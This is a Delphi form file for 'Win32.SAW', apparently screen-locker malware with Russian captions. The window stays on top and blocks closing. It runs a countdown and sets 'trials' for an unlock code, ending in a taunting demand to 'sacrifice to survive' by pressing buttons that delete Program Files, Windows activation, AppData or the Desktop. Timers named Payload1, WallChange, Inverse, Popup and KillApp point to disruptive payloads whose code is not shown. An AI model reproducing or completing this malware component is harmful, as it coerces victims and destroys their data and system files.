object Form2: TForm2
  Left = 0
  Top = 0
  BorderIcons = []
  BorderStyle = bsSingle
  Caption = 'Win32.SAW V1.0 (Patch 1)'
  ClientHeight = 479
  ClientWidth = 832
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'Tahoma'
  Font.Style = []
  FormStyle = fsStayOnTop
  OldCreateOrder = False
  Position = poDesktopCenter
  OnActivate = FormActivate
  OnCloseQuery = FormCloseQuery
  OnCreate = FormCreate
  PixelsPerInch = 96
  TextHeight = 13
  object GroupBox1: TGroupBox
    Left = 8
    Top = 87
    Width = 329
    Height = 141
    Caption = #1048#1089#1087#1099#1090#1072#1085#1080#1077' 1'
    TabOrder = 0
    object Label2: TLabel
      Left = 48
      Top = 16
      Width = 239
      Height = 24
      Caption = #1044#1072#1074#1072#1081' '#1085#1072#1095#1085#1077#1084' '#1089' '#1087#1088#1086#1089#1090#1086#1075#1086' '
      Font.Charset = DEFAULT_CHARSET
      Font.Color = clWindowText
      Font.Height = -20
      Font.Name = 'Tahoma'
      Font.Style = []
      ParentFont = False
    end
    object Label3: TLabel
      Left = 3
      Top = 46
      Width = 317
      Height = 13
      Caption = #1055#1086' '#1101#1090#1086#1084#1091' '#1087#1091#1090#1080' C:\SAW '#1085#1072#1093#1086#1076#1103#1090#1089#1103' '#1090#1077#1082#1089#1090#1086#1074#1099#1077' '#1092#1072#1081#1083#1099' '#1089' '#1095#1080#1089#1083#1072#1084#1080
    end
    object Label4: TLabel
      Left = 3
      Top = 65
      Width = 293
      Height = 13
      Caption = #1054#1076#1080#1085' '#1080#1079' '#1082#1086#1090#1086#1088#1099#1093' '#1089' '#1087#1072#1088#1086#1083#1077#1084' '#1076#1083#1103' '#1089#1083#1077#1076#1091#1102#1097#1077#1075#1086' '#1080#1089#1087#1099#1090#1072#1085#1080#1103'.'
    end
    object Edit1: TEdit
      Left = 3
      Top = 84
      Width = 317
      Height = 21
      TabOrder = 0
      Text = #1055#1072#1088#1086#1083#1100
    end
    object Button1: TButton
      Left = 0
      Top = 111
      Width = 326
      Height = 25
      Caption = #1044#1072#1083#1100#1096#1077
      TabOrder = 1
      OnClick = Button1Click
    end
  end
  object GroupBox2: TGroupBox
    Left = 551
    Top = 8
    Width = 273
    Height = 105
    Caption = #1058#1072#1081#1084#1077#1088
    TabOrder = 1
    object Label1: TLabel
      Left = 24
      Top = 3
      Width = 219
      Height = 105
      Caption = '00:00'
      Font.Charset = DEFAULT_CHARSET
      Font.Color = clWindowText
      Font.Height = -87
      Font.Name = 'Tahoma'
      Font.Style = []
      ParentFont = False
    end
  end
  object MediaPlayer1: TMediaPlayer
    Left = 280
    Top = 500
    Width = 253
    Height = 30
    DoubleBuffered = True
    ParentDoubleBuffered = False
    TabOrder = 2
  end
  object GroupBox3: TGroupBox
    Left = 8
    Top = 8
    Width = 537
    Height = 73
    Caption = #1056#1072#1079#1073#1083#1086#1082#1080#1088#1086#1074#1082#1072
    TabOrder = 3
    object Edit2: TEdit
      Left = 3
      Top = 16
      Width = 531
      Height = 21
      TabOrder = 0
      Text = #1050#1086#1076' '#1088#1072#1073#1083#1086#1082#1080#1088#1086#1074#1082#1080
    end
    object Button2: TButton
      Left = 3
      Top = 43
      Width = 531
      Height = 25
      Caption = 'Unblock'
      TabOrder = 1
      OnClick = Button2Click
    end
  end
  object GroupBox4: TGroupBox
    Left = 8
    Top = 225
    Width = 326
    Height = 208
    Caption = #1048#1089#1087#1099#1090#1072#1085#1080#1077' 2'
    Enabled = False
    TabOrder = 4
    Visible = False
    object Label5: TLabel
      Left = 3
      Top = 16
      Width = 318
      Height = 18
      Caption = #1061#1084'. '#1052#1086#1083#1086#1076#1077#1094' '#1090#1099' '#1089#1087#1088#1072#1074#1080#1083#1089#1103', '#1085#1086' '#1076#1072#1083#1100#1096#1077' '#1093#1091#1078#1077')'
      Font.Charset = DEFAULT_CHARSET
      Font.Color = clWindowText
      Font.Height = -15
      Font.Name = 'Tahoma'
      Font.Style = []
      ParentFont = False
    end
    object Label6: TLabel
      Left = 13
      Top = 40
      Width = 283
      Height = 11
      Caption = #1058#1077#1073#1077' '#1085#1072#1076#1086' '#1079#1072#1087#1086#1083#1085#1080#1090#1100' '#1096#1082#1072#1083#1091' '#1087#1086#1083#1085#1086#1089#1090#1100#1102' '#1076#1083#1103' '#1101#1090#1086#1075#1086' '#1078#1084#1080' '#1085#1072' '#1082#1085#1086#1087#1082#1091
      Font.Charset = DEFAULT_CHARSET
      Font.Color = clWindowText
      Font.Height = -9
      Font.Name = 'Tahoma'
      Font.Style = []
      ParentFont = False
    end
    object Panel1: TPanel
      Left = 13
      Top = 57
      Width = 300
      Height = 112
      Locked = True
      TabOrder = 0
      object SpeedButton1: TSpeedButton
        Left = 43
        Top = 15
        Width = 214
        Height = 82
        Caption = #1046#1052#1048
        OnClick = SpeedButton1Click
      end
    end
    object ProgressBar1: TProgressBar
      Left = 13
      Top = 175
      Width = 300
      Height = 17
      TabOrder = 1
    end
  end
  object GroupBox5: TGroupBox
    Left = 8
    Top = 430
    Width = 816
    Height = 41
    Caption = #1055#1072#1088#1086#1083#1100' '#1076#1083#1103' '#1088#1072#1079#1073#1083#1086#1082#1080#1088#1086#1074#1082#1080
    TabOrder = 5
    object Edit3: TEdit
      Left = 3
      Top = 17
      Width = 810
      Height = 21
      Enabled = False
      ReadOnly = True
      TabOrder = 0
      Text = 
        #1047#1076#1077#1089#1100' '#1087#1086#1103#1074#1080#1090#1089#1103' '#1087#1072#1088#1086#1083#1100' '#1087#1086#1089#1083#1077' '#1087#1088#1086#1093#1086#1078#1076#1077#1085#1080#1103' '#1074#1089#1077#1093' '#1080#1089#1087#1099#1090#1072#1085#1080#1081'. '#1050#1086#1090#1086#1088#1099#1081' ' +
        #1085#1072#1076#1086' '#1074#1074#1077#1089#1090#1080' '#1074' textbox '#39#1050#1086#1076' '#1088#1072#1079#1073#1083#1086#1082#1080#1088#1086#1074#1082#1080#39
    end
  end
  object GroupBox6: TGroupBox
    Left = 340
    Top = 119
    Width = 484
    Height = 314
    Caption = #1048#1089#1087#1099#1090#1072#1085#1080#1077' 3'
    TabOrder = 6
    Visible = False
    object Label7: TLabel
      Left = 96
      Top = 10
      Width = 289
      Height = 24
      Caption = #1052#1086#1083#1086#1076#1077#1094'. '#1053#1086' '#1085#1072#1076#1086' '#1087#1086#1090#1086#1088#1086#1087#1080#1090#1089#1103
      Font.Charset = DEFAULT_CHARSET
      Font.Color = clWindowText
      Font.Height = -20
      Font.Name = 'Tahoma'
      Font.Style = []
      ParentFont = False
    end
    object Label8: TLabel
      Left = 80
      Top = 40
      Width = 325
      Height = 29
      Caption = #1055#1086#1078#1077#1088#1090#1074#1091#1081' '#1095#1090#1086'-'#1073#1099' '#1074#1099#1078#1080#1090#1100' ;)'
      Font.Charset = DEFAULT_CHARSET
      Font.Color = clWindowText
      Font.Height = -24
      Font.Name = 'Tahoma'
      Font.Style = []
      ParentFont = False
    end
    object Label9: TLabel
      Left = 152
      Top = 231
      Width = 210
      Height = 64
      Caption = #1057#1082#1086#1088#1086'... '
      Font.Charset = DEFAULT_CHARSET
      Font.Color = clWindowText
      Font.Height = -53
      Font.Name = 'Tahoma'
      Font.Style = []
      ParentFont = False
    end
    object GroupBox7: TGroupBox
      Left = 3
      Top = 72
      Width = 478
      Height = 153
      Caption = #1050#1085#1086#1087#1086#1095#1082#1080
      TabOrder = 0
      object Button3: TButton
        Left = 3
        Top = 24
        Width = 472
        Height = 25
        Caption = #1059#1076#1072#1083#1080#1090#1100' Program Files'
        TabOrder = 0
        OnClick = Button3Click
      end
      object Button4: TButton
        Left = 3
        Top = 55
        Width = 472
        Height = 25
        Caption = #1059#1076#1072#1083#1080#1090#1100' '#1072#1082#1090#1080#1074#1072#1094#1080#1102' Windows'
        TabOrder = 1
        OnClick = Button4Click
      end
      object Button5: TButton
        Left = 3
        Top = 86
        Width = 472
        Height = 25
        Caption = #1059#1076#1072#1083#1080#1090#1100' AppData'
        TabOrder = 2
        OnClick = Button5Click
      end
      object Button6: TButton
        Left = 3
        Top = 117
        Width = 472
        Height = 25
        Caption = #1059#1076#1072#1083#1080#1090#1100' '#1056#1072#1073#1086#1095#1080#1081' '#1089#1090#1086#1083
        TabOrder = 3
        OnClick = Button6Click
      end
    end
  end
  object Timer: TTimer
    Enabled = False
    OnTimer = TimerTimer
    Left = 552
    Top = 80
  end
  object Payload1: TTimer
    Enabled = False
    Interval = 3500
    OnTimer = Payload1Timer
    Left = 408
    Top = 88
  end
  object Cursor: TTimer
    Enabled = False
    Interval = 3500
    OnTimer = CursorTimer
    Left = 456
    Top = 88
  end
  object ActivePayloads: TTimer
    Enabled = False
    Interval = 1
    OnTimer = ActivePayloadsTimer
    Left = 384
    Top = 88
  end
  object WallChange: TTimer
    Enabled = False
    Interval = 2500
    OnTimer = WallChangeTimer
    Left = 432
    Top = 88
  end
  object Popup: TTimer
    Enabled = False
    Interval = 10000
    OnTimer = PopupTimer
    Left = 360
    Top = 88
  end
  object Text: TTimer
    Enabled = False
    Interval = 15000
    OnTimer = TextTimer
    Left = 336
    Top = 88
  end
  object Check: TTimer
    Enabled = False
    Interval = 1
    OnTimer = CheckTimer
    Left = 293
    Top = 282
  end
  object Inverse: TTimer
    Enabled = False
    Interval = 2500
    OnTimer = InverseTimer
    Left = 504
    Top = 88
  end
  object Check2: TTimer
    Interval = 1
    OnTimer = Check2Timer
    Left = 788
    Top = 343
  end
  object KillApp: TTimer
    Enabled = False
    Interval = 1
    OnTimer = KillAppTimer
    Left = 480
    Top = 88
  end
end
